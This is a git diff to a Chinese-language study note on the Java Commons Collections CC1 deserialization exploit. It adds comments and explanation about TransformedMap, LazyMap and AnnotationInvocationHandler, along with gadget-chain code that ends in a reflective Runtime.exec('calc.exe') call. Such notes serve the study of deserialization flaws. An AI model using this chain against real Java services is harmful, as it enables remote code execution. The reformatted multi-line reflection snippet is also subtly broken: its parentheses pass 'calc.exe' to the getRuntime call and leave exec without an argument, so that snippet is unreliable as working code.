@@ -80,6 +80,7 @@ public class CC1TranformedMapExp {
 
         // 使用 TransformedMap 装饰原始 HashMap
         // 当调用 Map.Entry.setValue() 时，会自动触发 transformerChain.transform()
+        // 即一旦这个 Map 的内容被修改（调用 setValue），它就会自动触发绑定的 Transformer
         Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
 
 
@@ -119,6 +120,10 @@ public class CC1TranformedMapExp {
 }
 ```
 
+`TransformerMap` 当尝试向里面添加新元素（`put`）或者修改已有元素（`setValue`）时，它会自动调用绑定的 `Transformer` 对传入的数据进行加工。
+
+`AnnotationInvocationHandler` 在反序列化时，会遍历内部的 `memberValues`（即构造的恶意 Map）。如果发现 Map 里的某个 `key`，恰好是目标注解里的一个属性名，它就会执行 `memberValue.setValue(...)` 去修改这个值。
+
 `AnnotationType.getInstance(type)` 这里的 type 为构造方法里传入的 `Target.class`。memberTypes 获取到注解类型的所有方法，并循环遍历 memberValues 这个 Map，随后会调用 `setValue()`
 
 memberValues 即构造的 outerMap（TransformedMap 实例）。
@@ -152,7 +157,14 @@ InvokerTransformer 中通过反射来触发调用
 反射调用执行命令
 
 ```java
-Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),"calc.exe")
+Class.forName("java.lang.Runtime")
+	.getMethod("exec",String.class)
+	.invoke(Class.forName("java.lang.Runtime")
+	.getMethod("getRuntime")
+	.invoke(
+		Class.forName("java.lang.Runtime"),
+		"calc.exe"
+		)
 ```
 
 对应到 InvokerTransformer.transform
@@ -281,16 +293,17 @@ public class CC1LazyMapExp {
         Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
 
 
-        // 利用动态代理，将 readObject 的执行流导向 LazyMap.get()
+        // 利用动态代理，将“任意方法的调用”转换成对 LazyMap 的 get() 调用，即将 readObject 的执行流导向 LazyMap.get()
 
         // 1. 获取 AnnotationInvocationHandler 的构造函数 (因为它是私有的，需要反射)
         Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
         construct.setAccessible(true);
 
-        // 2. 构造 Handler1 (内部包裹着真正的炸弹 LazyMap)
+        // 2. 构造 Handler1 (理解为炸弹载体)，创建一个 AnnotationInvocationHandler 实例，里面装着你的恶意 lazyMap
         // 注意：第一个参数需要传入一个注解的 Class 对象，Retention.class 比较常用
         InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);
+		// 这个 handler1 本身还不具备攻击性，它只是一个“逻辑处理器”。它的逻辑是：“只要有人调我的方法，我就去那个 Map 里查一查。”
 
         // 3. 为 Map 接口创建动态代理对象，使用 handler1 来处理代理对象的所有方法调用
         Map proxyMap = (Map) Proxy.newProxyInstance(
